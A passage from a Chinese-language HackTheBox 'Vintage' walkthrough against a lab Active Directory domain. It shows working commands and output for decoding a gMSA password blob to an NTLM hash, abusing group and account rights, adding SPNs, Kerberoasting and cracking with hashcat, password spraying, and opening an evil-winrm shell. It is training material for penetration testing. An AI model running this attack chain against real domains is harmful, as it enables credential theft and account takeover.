LDAP        10.129.231.205  389    DC01             Account: gMSA01$              aes256-cts-hmac-sha1-96: bd949958ed381aa4cd13011375aea320670a891331b1dfe692ad47ab29690ee8
```

其本质是利用授权账户通过 LDAP 读取 GMSA 账户中的 `msDS-ManagedPassword` 条目，可以使用 LDAP Search 验证这一点：

```bash
$ netexec ldap 10.129.231.205 -u 'fs01$' -p 'fs01' --query '(&(ObjectClass=msDS-GroupManagedServiceAccount))' 'msDS-ManagedPassword' -k
LDAP        10.129.231.205  389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.231.205  389    DC01             [+] vintage.htb\fs01$:fs01
LDAP        10.129.231.205  389    DC01             [+] Response for object: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
LDAP        10.129.231.205  389    DC01             msDS-ManagedPassword b'\x01\x00\x00\x00$\x02\x00\x00\x10\x00\x12\x01\x14\x02\x1c\x02\xb1i@\xf0\xb5\x06b\xc5\xf0\xee\x83kyebS\xf9\xf0\xab\xd6\xa2Z\nA\xc0\xfe\xa6Y\xf4X)\xdc8\x92K\xfeI\x11zE\x14\t\xf5\n7\xa4\xdf\xc8o\xe1Q~\x07 \xdfD\xf2\xb5%\x9e\xebpj4\xc2rq,\x84\x943\xedg\xe6[\x0c\xb5\x00\x19\x9cs\x11\rj1\xdc\xcb\x84\xcej\xc5\x9fN\x97\xc4*y,\xee\x00\x8a#\x0e\xab=\x07e\xaalj\xf9\x9e\x16\xcc\xabR\x19\x1cX\xa2\x07\xcfL\xbd-\x15\x0c2\x8d*\x05N\x81X\xb2\x06\xbfX\xd7\xbc:^|\xd8T\xbc\x01\xdeE\x10\xcdYvn[\x15\xcc\xd5\xab\xa7n\xd0}\xb0R\xc6\xae\xfb\x99_\xb7\xc33\xaa^\x96+\xbcg\x067\x9ce\x90\x96\xf9bw.\xa9\xc4>\t2\xca~\xc74\xce\xcc\xcf\xe1\x06\x1c(L\xb3\xc3\xf8\xb6\x08\xbf\xden\x90\x99\xd3\xdd\xfc\xb9R\x97cF^\xca\xdeDX\xdc2@Zs$\x1d\x1e\x1eTd&/\xa8<\x0e\x10\'R\xffV\xb0\xc0,\x98\xcf\x8e\x00\x00\xc2/7,\x14\xf0\x03\x1f?\x10\x90g?\xd5\x9a\xf6\xbaL{\x9a\xe7\x01\x8e\xbcw\x97\xa2\x87\xd9\xaaz\x93\xe9\x11\xa8\xad\xc3\x1a\xe0\x1af\xa7\x91I\x0c\x92\x92N\xdeg$\xe4v/\xc1+g\x168\xdb\x83\x9d\x00s\xd0\x83\x9a\xb3\xca\xd0\x9d\xe7\xce\xbc`#3\xc2rU\xd2\xecZH\x01Xc\xb7\t\xdaN\x0c\x04\x86r\x88\x10\xf3=\x98W/\xcd\xda\x86Yp\x15~\x03\xe1\xc7\x12{d\x13\xde}y\x02\x8d\xe3\xaf\x8d\xddB\x9b]\x13\xf4Dh\xf7>\xcb\xc6\x9b\x9a\xdci"n\x0e\xbd%\x1e\xce\x83\x88\xec\x81\x0c\xf24V!=\xdf\xde\xb9\xab\xa3\xa2g\x7f\x1b\xf8\n\x15\xc6\xb0\xd0\x1d#\xe1V*\x8bGa\xdb-4\xaa\x1fG\x12\xdaO\x18\x0b\xcc\xf9-\xa1t\xa0\xc3#\x84\xcb\x15{i.\n^MMZ\xc7\x1d\x82z\x04\xbf\x91\x17M\r:\xfc\x85(\x9e\xcc\xd0\xfa\xb6\xa8\xba\xa3R\xf9\x0e\xf7>\x98\x82)\xa8\xae\x0eR\xb5\x141\x92q7\xa6\x95\x1f\xe5&\x1d\x00\x00\xc2\x14I\x19\xe1\x07\x00\x00\xc2\xb6xf\xe0\x07\x00\x00'
```

这串 blob 具备固定的结构，明文密码就在其中，根据脚本（改编自 [仓库](https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py) ）：

```python
from impacket.structure import Structure
from binascii import hexlify
from Cryptodome.Hash import MD4

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version', '<H'),
        ('Reserved', '<H'),
        ('Length', '<L'),
        ('CurrentPasswordOffset', '<H'),
        ('PreviousPasswordOffset', '<H'),
        ('QueryPasswordIntervalOffset', '<H'),
        ('UnchangedPasswordIntervalOffset', '<H'),
        ('CurrentPassword', ':'),
        ('PreviousPassword', ':'),
        ('QueryPasswordInterval', ':'),
        ('UnchangedPasswordInterval', ':'),
    )

    def fromString(self, data):
        Structure.fromString(self, data)
        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']
        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset'] - self['PreviousPasswordOffset']]
        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset'] - self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

data = b'\x01\x00\x00\x00$\x02\x00\x00\x10\x00\x12\x01\x14\x02\x1c\x02\xb1i@\xf0\xb5\x06b\xc5\xf0\xee\x83kyebS\xf9\xf0\xab\xd6\xa2Z\nA\xc0\xfe\xa6Y\xf4X)\xdc8\x92K\xfeI\x11zE\x14\t\xf5\n7\xa4\xdf\xc8o\xe1Q~\x07 \xdfD\xf2\xb5%\x9e\xebpj4\xc2rq,\x84\x943\xedg\xe6[\x0c\xb5\x00\x19\x9cs\x11\rj1\xdc\xcb\x84\xcej\xc5\x9fN\x97\xc4*y,\xee\x00\x8a#\x0e\xab=\x07e\xaalj\xf9\x9e\x16\xcc\xabR\x19\x1cX\xa2\x07\xcfL\xbd-\x15\x0c2\x8d*\x05N\x81X\xb2\x06\xbfX\xd7\xbc:^|\xd8T\xbc\x01\xdeE\x10\xcdYvn[\x15\xcc\xd5\xab\xa7n\xd0}\xb0R\xc6\xae\xfb\x99_\xb7\xc33\xaa^\x96+\xbcg\x067\x9ce\x90\x96\xf9bw.\xa9\xc4>\t2\xca~\xc74\xce\xcc\xcf\xe1\x06\x1c(L\xb3\xc3\xf8\xb6\x08\xbf\xden\x90\x99\xd3\xdd\xfc\xb9R\x97cF^\xca\xdeDX\xdc2@Zs$\x1d\x1e\x1eTd&/\xa8<\x0e\x10\'R\xffV\xb0\xc0,\x98\xcf\x8e\x00\x00\xc2/7,\x14\xf0\x03\x1f?\x10\x90g?\xd5\x9a\xf6\xbaL{\x9a\xe7\x01\x8e\xbcw\x97\xa2\x87\xd9\xaaz\x93\xe9\x11\xa8\xad\xc3\x1a\xe0\x1af\xa7\x91I\x0c\x92\x92N\xdeg$\xe4v/\xc1+g\x168\xdb\x83\x9d\x00s\xd0\x83\x9a\xb3\xca\xd0\x9d\xe7\xce\xbc`#3\xc2rU\xd2\xecZH\x01Xc\xb7\t\xdaN\x0c\x04\x86r\x88\x10\xf3=\x98W/\xcd\xda\x86Yp\x15~\x03\xe1\xc7\x12{d\x13\xde}y\x02\x8d\xe3\xaf\x8d\xddB\x9b]\x13\xf4Dh\xf7>\xcb\xc6\x9b\x9a\xdci"n\x0e\xbd%\x1e\xce\x83\x88\xec\x81\x0c\xf24V!=\xdf\xde\xb9\xab\xa3\xa2g\x7f\x1b\xf8\n\x15\xc6\xb0\xd0\x1d#\xe1V*\x8bGa\xdb-4\xaa\x1fG\x12\xdaO\x18\x0b\xcc\xf9-\xa1t\xa0\xc3#\x84\xcb\x15{i.\n^MMZ\xc7\x1d\x82z\x04\xbf\x91\x17M\r:\xfc\x85(\x9e\xcc\xd0\xfa\xb6\xa8\xba\xa3R\xf9\x0e\xf7>\x98\x82)\xa8\xae\x0eR\xb5\x141\x92q7\xa6\x95\x1f\xe5&\x1d\x00\x00\xc2\x14I\x19\xe1\x07\x00\x00\xc2\xb6xf\xe0\x07\x00\x00'

blob = MSDS_MANAGEDPASSWORD_BLOB()
blob.fromString(data)

current_password = blob['CurrentPassword'][:-2]

print("[+] 原始密码字节长度:", len(current_password))
print("[+] 原始密码 (hex):")
print(current_password.hex())

ntlm = MD4.new()
ntlm.update(current_password)
print("\n[+] NTLM:", hexlify(ntlm.digest()).decode())
```

运行：

```bash
$ python test.py
[+] 原始密码字节长度: 256
[+] 原始密码 (hex):
b16940f0b50662c5f0ee836b79656253f9f0abd6a25a0a41c0fea659f45829dc38924bfe49117a451409f50a37a4dfc86fe1517e0720df44f2b5259eeb706a34c272712c849433ed67e65b0cb500199c73110d6a31dccb84ce6ac59f4e97c42a792cee008a230eab3d0765aa6c6af99e16ccab52191c58a207cf4cbd2d150c328d2a054e8158b206bf58d7bc3a5e7cd854bc01de4510cd59766e5b15ccd5aba76ed07db052c6aefb995fb7c333aa5e962bbc6706379c659096f962772ea9c43e0932ca7ec734cecccfe1061c284cb3c3f8b608bfde6e9099d3ddfcb9529763465ecade4458dc32405a73241d1e1e5464262fa83c0e102752ff56b0c02c98cf8e

[+] NTLM: e082d85e0e0e5c2132e116c852cd1159
```

能得到一样的结果。

> 密码通常不可读，因此用 hex 展示。

通过 `getTGT.py` 获得 TGT：

```bash
$ getTGT.py vintage.htb/GMSA01$ -hashes :e082d85e0e0e5c2132e116c852cd1159 -k -dc-ip 10.129.231.205
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in GMSA01$.ccache
```

修改环境变量：

```bash
$ export KRB5CCNAME=/home/zyf/htb_workdir/vintage/GMSA01$.ccache
```

将他自己添加进 SERVICEMANAGERS 组中：

```bash
$ bloodyAD -u 'GMSA01$' -k --host dc01.vintage.htb --dc-ip 10.129.231.205 -d vintage.htb add groupMember "SERVICEMANAGERS" "GMSA01$"
[+] GMSA01$ added to SERVICEMANAGERS
```

此时，我可以直接修改三个 SVC 账户的密码，或者创建他们的 Shadow Credentials。

## 五、SVC Account

这三个 SVC 账户中，有一个并未启用：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/0920698f3f230383.png)

而且 SQL 意味着该账户可能管理着数据库服务，可能能泄露关键信息。

这三个 SVC 账户均无权访问 WinRM，因为不属于 `REMOTE MANAGEMENT USERS` 组：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/0013588b94dbed52.png)

GMSA01$ 具备对 SVC 账户的完全控制权限（ `GenericAll` ），我可以启用 `svc_sql` 账户。

注意，当前本地存储的 TGT（ `GMSA01$.ccache` ）是还未入 SERVICEMANAGERS 组的时候申请的，关系更新后，TGT 并不会跟着更新，因此需要重新申请 TGT：

```bash
$ getTGT.py vintage.htb/GMSA01$ -hashes :e082d85e0e0e5c2132e116c852cd1159 -k -dc-ip 10.129.231.205
Impacket v0.14.0.dev0+20260729.95945.570f2833 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in GMSA01$.ccache
```

由于命名和文件位置没变，我无需更改环境变量。

启动 `svc_sql` 账户：

```bash
$ bloodyAD --dc-ip 10.129.231.205 -H dc01.vintage.htb -d vintage.htb -u GMSA01$ -k msldap enableuser "CN=SVC_SQL,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB"
User enabled
```

我打算使用 Shadow Credentials 技术：

```bash
$ bloodyAD --dc-ip 10.129.231.205 -H dc01.vintage.htb -d vintage -u GMSA01$ -k add shadowCredentials 'CN=SVC_SQL,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB'
[+] KeyCredential generated with following sha256 of RSA key: 0e928eb709d7560f8e45be1611c64c003200f07c8498ab4d174d11fc57a9e0d2
[-] PKINIT failed on DC 10.129.231.205, you must find a Kerberos server with a certification authority!
[-] Retry on a working KDC and do:
[snip]
kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)"
```

根据报错提示，PKINIT 失败，这意味着本靶机很可能没有开启证书认证方式。

我还可以做“改密码”操作，但这样我就失去了获取密码的权力。

> 有效密码可以整理成字典，往后可以进行密码喷洒等操作。

一个有效提取密码的方式是：通过有效凭据进行 Kerberoasting 操作，目标是这三个 SVC 账号上的 SPN。

在 BloodHound 中没发现这三个账号拥有 SPN，但我可以手动为他们添加 SPN：

```bash
$ bloodyAD --dc-ip 10.129.231.205 -H dc01.vintage.htb -d vintage.htb -u GMSA01$ -k msldap addspn 'CN=SVC_LDAP,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB' 'svc_ldap_krb/dc01.vintage.htb'
SPN added!

$ bloodyAD --dc-ip 10.129.231.205 -H dc01.vintage.htb -d vintage.htb -u GMSA01$ -k msldap addspn 'CN=SVC_SQL,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB' 'svc_sql_krb/dc01.vintage.htb'
SPN added!

$ bloodyAD --dc-ip 10.129.231.205 -H dc01.vintage.htb -d vintage.htb -u GMSA01$ -k msldap addspn 'CN=SVC_ARK,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB' 'svc_ark_krb/dc01.vintage.htb'
SPN added!
```

实行 Kerberoasting：

```bash
$ netexec ldap 10.129.231.205 -u 'GMSA01$' -H 'e082d85e0e0e5c2132e116c852cd1159' -k --kerberoasting output.txt
LDAP        10.129.231.205  389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.231.205  389    DC01             [+] vintage.htb\GMSA01$:e082d85e0e0e5c2132e116c852cd1159
LDAP        10.129.231.205  389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.231.205  389    DC01             [*] Total of records returned 3
LDAP        10.129.231.205  389    DC01             [*] sAMAccountName: svc_ark, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 21:45:27.913095, lastLogon: <never>
LDAP        10.129.231.205  389    DC01             $krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb\svc_ark*$1cfcf828c8f7c18618168fe1487e34c1$d58e93461e362d5a91475d57bcd4c327c1da37f0048a304dede8aa8fee584c6ece91ec3e950121250a3ab3f45ae9aefdf2a89de12119cd069ad6e041fa67a4906075e5f94595bad34baeb25add60b081c1079a11ef02ccc64d4bdd7392749061abd62119529d7dc922af02803187d3302410099ae8e94c7098e219c3f4a68861b422664bd9cf7697f51d9614194c7ff9577215339ffeedfaec8032e1d75482a42f6115f2847769de72b394922d7a8ea393d945c6f6c787cbbc3e66a567aa0521230452036677d386da94be56d754b2277ba0edc452cd8f097cbe84965f8eef5d02e7db2402461278a56d282164889b5a16fb272281aa2e85b9c0ff5640900313acda50429c7efed5d602413fd56d7ee90e728a66626f383ebc834e97a06ccc1e0d75aff8076474bce57a040d64543e2fe0e9fd82bd60ce2ea0494f1b6aa160bba7d26e9b3c4794741bdab83c4a1f5c436067872c6245dbe09883e0b71b58d2a3e95bad3a444b75aea8b59ca8bb020067dc2275c8fc7c8025ce56272371a939a089360ab3f10c8642826b32b54c6af3c148409ac09ef0751ffa8c4c07bc981adb718d4f92a31756bb9b5985e70c221f6a3df54b9bb4eaead51b98b97d4872987b35dcbd2cc7ef75e138c89bc9e30225d73b460fc24bb14cf9afb18ca774d9f8700f1623ee8f786844f321f883955de73376a503ae506dbb18a9d2397ee4e90c83f0c5ee61dfabfc92f7f2c755e08fb2aee5d8a9cc729526bda5c48e71d28745fd1831e4fafa4f521205abde9179e2222980d2f2957d1c58467d5a43393f120dcfa7b51fc75dacb4beceed69c8d9f8c41a9b31e4c25aeffaecf5eeeece1aeb9df0a22f7dc8c415fa050ade21c961210d0e7c328b2679c241d5bb9fc1ee5b043da2651ddfad5c95c77f20e6310712868d8c320d1699ad91f344acc8eac478b5514aa52385c093ba56bf4740418bd274c88b078e8f98fd1ed9b6d3afa07fa010f5af60dcf55aff2c728458487e131d47a29c5e2105ab9ec79f7abaccb791c295f2ed0ef80d983da9b7159c229c3d6a2c769d6a77d25cd79af964e0831280dec19f5903e9ccf5cb64fb9c447c25a2fd0d8a79ce56873c7f88025934bf9f724dbebd6cca55da941e5a36bb485850b6d8b3319266d324aa7a62586a14fcb848c25dadf720cb9b5266d886506418f49b0577e0554d322b37b0000a78d02f8fe867eede1b83728ddbeb2be0afdaa2216ed7e1a319875e7fbebe4ffb6af49081a86b7e3909737ad5642b038e45e5468f2a98714d2a26d079c8ec26146ba042856d36c79d4b05861920117c0750d1577a5c6d1b0faf7b14a99ce4da411a9fb94a39b6c11ed19cb3d2b2c445d2d6c3af5d8352cb2acc01d2a256b2b4d093d8ee5b8494e53c759fa9b4b47ab2994bbc3be68227f7bfbfeded23ff9b4bc550014e9f
LDAP        10.129.231.205  389    DC01             [*] sAMAccountName: svc_ldap, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 21:45:27.881830, lastLogon: <never>
LDAP        10.129.231.205  389    DC01             $krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb\svc_ldap*$ee1b8c5cdc46772aff6f4bbab036debf$2035bdf7e0be3f60b46588b3c9833aa48049bd805ec10423012903ce45fdd20c9b289b412df7d8ab4af981818ffd82a7b55cd1eb044b4ba5e5651bdea1e2405af7e05cb69030f0975fc60603513f94ba9d6080bf787a8c82cdc632601016c493be443ad756d41b64fcbff4a2ec4f1dd48f11d36041aac65a8cc637701be057bfddf842674abb92055dc7b37e8f9aaebecab0bf3792ff0c2e5c2ec8b60bdb3de86ef826ac9e25aa95d80daf5ddeb00b0a442f882780957e1069018fc6f8a293e42523d4f1bb47d6d292d61744b816edbb08a7c341d1ef7b8329e401d2d6cb10672343cdbade6e8da2b3e38e2975fe5b48db8c7f2dfca8534ecc54bb9882339f6b2f899c85e1e62cd3f061f83169954ce5229b1444dffe5bfb54e83944475b01056002af56bd3454324a40e3fb71b919e4eac5a39ab475fe45bbae35589e5ded0d42fec1dc81f0924c5ec46bb071a0f2a39138f1eb49ba93a9c047c6b785d65f6873583ae70ced758b95401733936eed7a8400718f3ea34648b50049be338c2420f0ed5b47b20680944036611bd028d06948d31283dac6c3e006ba106d2d0d8a6157b0f297f7a7e76dbc4d4d4f9358d82d3043090ca67bf0fc32a74005a169a0976ebee33c0175914d3512487d417d660c15fda0ddceeeec60e5021d08350d7df5d10b629a1831fd450f93025c3cf522434a7dddf8805865a92015ac289eb9cdd71d4c7721cf5983c5a4075691b5b55598998694dc2337e0c3c7289e074a88d9f2813244c1da955d44cdbd7ae371055e4b5283817801691a1a26ac241140f3359039b8430c0345a10c0d622e13c2e3889eaab7e5d9b39b80e23f57c99e9ba078c94bcf097f2750211b18a9960155a1cd040ef726ad594eda65c84a37625d5a8efe765c8c12ac158e1cda04c33932d07042e31d630a6359c5b284ac9e0455e0095d579a4e9f822cb589a2e480a335d020726c197e06e17cb9e3da302228de9ce983616855b106386d5650969bdb437c23d7d0726717cd17ef7ab9c6cdf0c1745345d2d4ad51c091e0fe84c53070df17413726a09e3fe81d43acfc4dadb6e787ac5bbc31009505a95b211ac93f4ddd3d7d876de2f67b90233ea71df7e2527a3aa410c75fda2049c5dd54ce9847ad763601b00b5ab108e8b3b4f21f366ab4347964e5ab226f93a9bdf06639bcd38fc3de4b6053beef70ac23394ba218f00dfbba67c2a7935371aeaacef9bcb627a59849c84157b85afded38e52e0511bcdabe657e3b3d231cf38d82262d14a446017623d2b79d00bb358dd630964c340825a0cf66566d9f85f860d84523b3e5b5f90b90df032b64d31bc611fda2e54ea8a5f681f9dcd0ead7ff205021d48359ce6772613d3117c329d0c8ae262ee8daec90d2ad387eb7297a1c4441dfa574266bcdb3d679598a56c19d576f3045315fff
LDAP        10.129.231.205  389    DC01             [*] sAMAccountName: svc_sql, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2026-08-14 16:52:05.440186, lastLogon: 2026-08-14 16:46:31.752618
LDAP        10.129.231.205  389    DC01             $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$69793656a20775f8d555075b602ac1c2$90b4e8a895ca3b67537c2eb02652be20208532448532f66646508159df23424c1f7636bb9b1b5ddd3b5027632993538d752d5d26fe0f09c5420de835882ba4dfc3c57b95b1518991eae141a0aaf1290112ba4a26b2ad0c2c82f3979288fefbba1393081786c1a142852a09cd4da825c390c2523b88de41ec69adc3c0ca13133fada532e98f8227ebce012a1b56afd2977a79e8f4387050027a1f20c7954d6a5d9c722099f9aea9bbca1acb42c715d376b96cd7e31352b26df306dbe477224523eea5584ad374dc97a6d986aea68917867bd9ad621bf0562255a2cb010e70180d77f3b96db06ac55465a07e44882d6009096b8ed93ae3ce75b921599af56ae0807f1424c6a2ca2dd05d29bd223804548b0d785e54d8936917f130dbde890a4865e6309ccedba9a9687d18461f414bf554381eaadffa557ea42689ae69b05b865683c9770e8304cbd80bac30f1d05f72b07c4a547b9444f894e6f7805c26029b831d74d37b5cecb42a223d2bee75d5a8c782dbe5b3f4b2d6294308bab459219c2ad5f82f3d1aaa085ea615deee8c70c29e7b14927572f90f7e7197ff207c27bcbc46767895f91703396462b81e878bb29509a1bfa770e5f5ff8bb9f3d9887ebaa0a251afcdd9046da7bb102cc508a3121b80dca6c8ff8193cf5fb437d2f34a739d197b81e9f84ac44135c766bac21967a750ea2a45c6f9eacc8c74034f4f2156d73fa7b80e895d06a44fca8fa60e00c6a3017154fd3cf69edc7799ae64a278744db1b5b1f0535735a75ae20b5d46b5821d1db17335f15ba9eafc58986be82464bb069d93b0ea69e26e4cebfd0181c231487fb23d97440c91a102291d5f21d53774b7335f0f7ba302692d5d3b80c1058e4bd78ee9f1739609abf82632d29479b143c57c14f34c12a36d784da58b0fc86d574b20677d717e3f94d451d82b50ad347241e1824e75142987c81c51c53dcf2fde7112e032f7f72cf621ed174de9b36afc4dedb4763db520a036b6c61e9d7ac2f0b2f097dc5de3c437308dfc86e9427477ae5d8661a24d4069e82c149c1fd35c0b39800f93a1f2612c518b199e8672c573455155cb8c58fc6e3f77c404e9f15830162963cd023fe00e3d94a28c99d0be3a7a67b0c28e9041904461203f62357ea08ef6d84b572cce002ffaed5aae9c4c42a3616bb665d6c5bb1deff3d175ac875a5ff10d3b9d88ca5df2c828bb84fc7bf3aad14fbf080f2d190fbb5b7c264e5d874040514084ebe095f51d4b6e1fbaf28ff25817b15d018ced2e6e6a3c1b801c1f70d6b6cc404c79abcc4eb29b55e672164c806e07658e8c1e76a973a0b343990cffe0d928da3bdb6b96ad97fd11242dda7f9f2d497ba82f1c64b824b29e148984046757d00216f804470090046d7c78af0350d716f95d85725ecee97fa9ff12cfa2bb58ebe15b01cc00a493
```

`hashcat` 破解：

```powershell
.\hashcat.exe -m 13100 .\output.txt .\rockyou.txt                              
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$69793656a20775f8d555075b602ac1c2$90b4e8a895ca3b67537c2eb02652be20208532448532f66646508159df23424c1f7636bb9b1b5ddd3b5027632993538d752d5d26fe0f09c5420de835882ba4dfc3c57b95b1518991eae141a0aaf1290112ba4a26b2ad0c2c82f3979288fefbba1393081786c1a142852a09cd4da825c390c2523b88de41ec69adc3c0ca13133fada532e98f8227ebce012a1b56afd2977a79e8f4387050027a1f20c7954d6a5d9c722099f9aea9bbca1acb42c715d376b96cd7e31352b26df306dbe477224523eea5584ad374dc97a6d986aea68917867bd9ad621bf0562255a2cb010e70180d77f3b96db06ac55465a07e44882d6009096b8ed93ae3ce75b921599af56ae0807f1424c6a2ca2dd05d29bd223804548b0d785e54d8936917f130dbde890a4865e6309ccedba9a9687d18461f414bf554381eaadffa557ea42689ae69b05b865683c9770e8304cbd80bac30f1d05f72b07c4a547b9444f894e6f7805c26029b831d74d37b5cecb42a223d2bee75d5a8c782dbe5b3f4b2d6294308bab459219c2ad5f82f3d1aaa085ea615deee8c70c29e7b14927572f90f7e7197ff207c27bcbc46767895f91703396462b81e878bb29509a1bfa770e5f5ff8bb9f3d9887ebaa0a251afcdd9046da7bb102cc508a3121b80dca6c8ff8193cf5fb437d2f34a739d197b81e9f84ac44135c766bac21967a750ea2a45c6f9eacc8c74034f4f2156d73fa7b80e895d06a44fca8fa60e00c6a3017154fd3cf69edc7799ae64a278744db1b5b1f0535735a75ae20b5d46b5821d1db17335f15ba9eafc58986be82464bb069d93b0ea69e26e4cebfd0181c231487fb23d97440c91a102291d5f21d53774b7335f0f7ba302692d5d3b80c1058e4bd78ee9f1739609abf82632d29479b143c57c14f34c12a36d784da58b0fc86d574b20677d717e3f94d451d82b50ad347241e1824e75142987c81c51c53dcf2fde7112e032f7f72cf621ed174de9b36afc4dedb4763db520a036b6c61e9d7ac2f0b2f097dc5de3c437308dfc86e9427477ae5d8661a24d4069e82c149c1fd35c0b39800f93a1f2612c518b199e8672c573455155cb8c58fc6e3f77c404e9f15830162963cd023fe00e3d94a28c99d0be3a7a67b0c28e9041904461203f62357ea08ef6d84b572cce002ffaed5aae9c4c42a3616bb665d6c5bb1deff3d175ac875a5ff10d3b9d88ca5df2c828bb84fc7bf3aad14fbf080f2d190fbb5b7c264e5d874040514084ebe095f51d4b6e1fbaf28ff25817b15d018ced2e6e6a3c1b801c1f70d6b6cc404c79abcc4eb29b55e672164c806e07658e8c1e76a973a0b343990cffe0d928da3bdb6b96ad97fd11242dda7f9f2d497ba82f1c64b824b29e148984046757d00216f804470090046d7c78af0350d716f95d85725ecee97fa9ff12cfa2bb58ebe15b01cc00a493:Zer0the0ne
```

仅一条破解成功，获得凭据：

```plain
username: svc_sql
password: Zer0the0ne
```

## 六、C.Neri Shell

虽说有了新的凭据，但该用户：

-   没有 WinRM 权限
-   BloodHound 中没找到出边
-   没看到他属于有意思的组

之前通过 LDAP 枚举过密码策略，很宽松，我打算用 `svc_sql` 的密码进行一轮密码喷洒：

```bash
$ netexec ldap 10.129.231.205 -u users.txt -p 'Zer0the0ne' -k --continue-on-success
LDAP        10.129.231.205  389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.231.205  389    DC01             [+] vintage.htb\C.Neri:Zer0the0ne
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.231.205  389    DC01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```

存在密码复用的现象，再次获得新的凭据：

```plain
username: C.Neri
password: Zer0the0ne
```

该用户属于 `REMOTE MANAGEMENT USERS` 组，因此具备访问 WinRM 的权限。

申请 TGT：

```bash
$ kinit C.Neri@VINTAGE.HTB
Password for C.Neri@VINTAGE.HTB:
```

通过 `evil-winrm` 获取该用户的 Shell：

```bash
$ evil-winrm -i dc01.vintage.htb -u 'C.Neri' -r VINTAGE.HTB

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: User is not needed for Kerberos auth. Ticket will be used

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents>
```

在该用户的 Desktop 目录中，存在 User Flag：

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> cat user.txt
b8f95c***************************
```

该账户同样具备对 SVC 账户的完全控制权限：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fa84a85fc7f7ecc8.png)

该账户有一个管理员版本：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/017d688d70d907ed.png)

其管理员版，即 `c.neri_adm` 拥有一条提权到域管的路径：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fb005511e2c266c0.png)

在 `%AppData%\Microsoft\Credentials\` 目录中，存在一个经过 DPAPI（Data Protection API）加密的凭据文件：

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> ls -force


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
